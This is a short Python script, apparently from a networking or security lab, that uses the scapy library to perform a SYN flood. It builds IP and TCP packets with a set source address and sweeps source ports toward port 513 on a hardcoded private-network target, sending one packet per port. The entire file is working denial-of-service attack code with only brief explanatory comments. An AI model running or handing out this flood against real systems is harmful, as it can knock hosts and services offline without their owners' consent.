##
#Performs a syn flood on a target
##
from scapy.all import *

def synflood(src, tgt):
	"flood targets with syn packets"

	for sport in range(1024, 65535):
		
		IPlayer = IP(src=src, dst=tgt)				#create IP datagram, indicating src and dst IP
		TCPlayer = TCP(sport=sport, dport=513)		#create TCP packet, indicating src and dst IP
		pkt = IPlayer / TCPlayer					# '/' composition operator. Allows us to stack layers
		send(pkt)									#send packet

src = "10.10.10.5"
dst = "10.10.10.2"
synflood(src, dst)